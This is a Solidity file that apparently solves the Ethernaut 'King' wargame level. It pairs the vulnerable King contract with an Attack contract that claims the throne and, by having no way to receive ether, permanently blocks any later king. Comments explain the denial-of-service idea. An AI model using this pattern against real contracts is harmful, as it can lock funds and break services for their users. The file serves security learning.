// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


//////// @title Solution Vault
/// @author  Yash Patel

// => Here we have to prevent someone else from becoming the King
// => The contract works in a way where if someone send more eth than the current king then the current will be replaced with the new user as a king and the old king will get the current value send by the king as the prize
// => We have to prevent this so we have to stop contract from accepting ether if noone can send ether than no will be able to become the king
// => 
contract Attack {
    constructor(address payable _king) payable {
        uint256 prize = King(_king).prize();
        (bool ok,) = _king.call{value: prize}("");
        require(ok, "Call failed");
    }
    // To prevent someone else to claim we have to not accept payment we should revert when someone tries to become king
    // So our contract should not accept the funds as of now if someone tries to send us funds they will not able to 
    // If we have fallback or receive function they can send us funds.
}


contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}